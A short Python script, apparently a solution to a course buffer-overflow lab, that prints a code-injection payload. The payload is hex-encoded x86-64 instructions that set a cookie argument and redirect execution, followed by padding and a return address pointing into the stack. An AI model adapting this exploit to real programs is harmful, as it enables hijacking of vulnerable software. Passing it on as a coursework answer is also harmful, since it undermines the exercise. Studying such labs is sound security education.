mov_cookie = "\x48\xbf\x78\x43\x27\x2d\x00\x00\x00\x00"
#call_touch2="\x9a\x40\x17\xe2\x00\x00\x00\x00\x00"
#mov_addr_rsp="\x48\xbc\xe2\x17\x40\x00\x00\x00\x00\x00"
mov_addr_rsp="\x48\xc7\x04\x24\xe2\x17\x40\x00"
ret="\xc3"

padding = "a"*(40-len(mov_addr_rsp)-len(mov_cookie) - len(ret))
rip ="\x98\xe5\x67\x55\x00\x00\x00\x00"
print mov_cookie + mov_addr_rsp + ret +  padding + rip